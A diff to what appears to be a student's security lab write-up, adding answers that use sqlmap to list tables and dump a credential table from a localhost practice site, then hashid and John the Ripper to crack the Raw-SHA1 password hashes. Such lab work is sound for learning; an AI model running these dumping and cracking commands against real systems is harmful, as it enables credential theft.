@@ -111,5 +111,37 @@ Once executed successfully, the permissions of /etc/shadow will be changed to 77
 **Question 2**: Use sqlmap to get tables, users information
 **Answer 2**:
 
+After we retrieved the available databases (information_schema and sqllab_users), next exploit further the sqllab_users table
+
+``` 
+    sqlmap -u "http://localhost:80/unsafe_home.php?username=test&Password=test" -D sqllab_users --tables
+    sqlmap -u "http://localhost:80/unsafe_home.php?username=test&Password=test" -D sqllab_users -T credential --dump
+```
+
+On output, it can be observed that there's only one table (credential) in the sqllab_users database, and using the second command we can retrieve the full information from the credential table with the password column still being hashed.
+
+![image](images/image2.png)
+![image](images/image5.png)
+
 **Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
 **Answer 3**:
+
+In Answer 2, we already dumpped and stored the hashed password to a separate file for further exploit.
+
+To identity the hash algorithm, we'll use hashid, a library in python.
+
+```
+    hashid -mj hash_pw.txt
+```
+
+![image](images/image3.png)
+
+Hashid suggest that the encrypt can be crack by using john specifically the format raw-sha1
+
+```
+    john --format=Raw-SHA1 hash_pw.txt
+```
+
+All the passwords have been cracked!
+
+![image](images/image6.png)
